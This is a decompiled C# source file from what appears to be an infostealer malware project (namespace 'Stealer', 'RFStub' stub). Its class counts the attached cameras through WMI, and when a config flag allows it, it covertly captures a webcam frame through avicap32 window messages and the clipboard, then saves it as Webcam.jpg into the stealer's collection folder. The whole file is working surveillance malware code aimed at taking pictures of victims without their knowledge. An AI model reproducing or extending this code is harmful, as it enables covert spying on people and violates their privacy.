using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using RFStub;

namespace Stealer;

internal sealed class WebcamScreenshot
{
	private static IntPtr Handle;

	private static int delay = 3000;

	[DllImport("avicap32.dll")]
	public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);

	[DllImport("user32")]
	public static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

	private static int GetConnectedCamerasCount()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		int num = 0;
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						enumerator.get_Current();
						num++;
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
			Console.WriteLine("GetConnectedCamerasCount : Query failed");
		}
		return num;
	}

	public static bool Make(string sSavePath)
	{
		//IL_00c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c9: Expected O, but got Unknown
		if (Config.WebcamScreenshot != "1")
		{
			return false;
		}
		if (GetConnectedCamerasCount() != 1)
		{
			return false;
		}
		try
		{
			Clipboard.Clear();
			Handle = capCreateCaptureWindowA("WebCap", 0, 0, 0, 320, 240, 0, 0);
			SendMessage(Handle, 1034u, 0, 0);
			SendMessage(Handle, 1074u, 0, 0);
			Thread.Sleep(delay);
			SendMessage(Handle, 1084u, 0, 0);
			SendMessage(Handle, 1054u, 0, 0);
			SendMessage(Handle, 1035u, 0, 0);
			Image val = (Image)Clipboard.GetDataObject().GetData(DataFormats.Bitmap);
			Clipboard.Clear();
			val.Save(sSavePath + "\\Webcam.jpg", ImageFormat.get_Jpeg());
			val.Dispose();
			Counter.WebcamScreenshot = true;
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
			return false;
		}
		return true;
	}
}
